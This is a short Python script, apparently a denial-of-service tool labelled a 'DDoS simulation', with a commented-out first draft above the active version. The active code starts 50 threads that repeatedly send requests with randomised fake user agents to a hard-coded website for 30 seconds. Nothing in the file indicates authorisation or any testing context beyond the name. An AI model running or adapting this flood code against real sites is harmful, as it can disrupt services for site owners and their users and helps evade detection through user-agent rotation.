# import requests
# import threading
# import random
# import time
#
# from fake_useragent import UserAgent
#
# URL = 'https://shaxzodbek.com/'
# THREAD_COUNT = 50
#
# ua = UserAgent()
#
# def attack(thread_id):
#     while True:
#         try:
#             headers = {'User-Agent': ua.random}
#             response = requests.get(URL, headers=headers, timeout=3)
#             print(f'Thread {thread_id} sent request, status code: {response.status_code}')
#         except requests.exceptions.RequestException as e:
#             print(f'Thread {thread_id} encountered an error: {e}')
#         time.sleep(random.uniform(0.1, 0.5))
#
#
# def run_ddos_simulation():
#     print(f'Starting DDoS simulation with {THREAD_COUNT} threads...')
#     threads = []
#     for i in range(THREAD_COUNT):
#         t = threading.Thread(target=attack, args=(i,))
#         t.daemon = True
#         threads.append(t)
#     time.sleep(30)
#     print("Simulation was done (30 seconds spent)")
#
#
# if __name__ == '__main__':
#     run_ddos_simulation()
#     print("Simulation was done (30 seconds spent)")

import requests
import threading
import random
import time

from fake_useragent import UserAgent

URL = 'https://shaxzodbek.com'
THREAD_COUNT = 50
SIMULATION_DURATION = 30  # seconds

ua = UserAgent()

def attack(thread_id, stop_time):
    while time.time() < stop_time:
        try:
            headers = {'User-Agent': ua.random}
            response = requests.get(URL, headers=headers, timeout=3)
            print(f'Thread {thread_id} sent request, status code: {response.status_code}')
        except requests.exceptions.RequestException as e:
            print(f'Thread {thread_id} encountered an error: {e}')
        time.sleep(random.uniform(0.1, 0.5))


def run_ddos_simulation():
    print(f'Starting DDoS simulation with {THREAD_COUNT} threads for {SIMULATION_DURATION} seconds...')
    stop_time = time.time() + SIMULATION_DURATION
    threads = []

    for i in range(THREAD_COUNT):
        t = threading.Thread(target=attack, args=(i, stop_time))
        t.daemon = True
        t.start()
        threads.append(t)

    time.sleep(SIMULATION_DURATION)
    print("Simulation completed.")


if __name__ == '__main__':
    run_ddos_simulation()
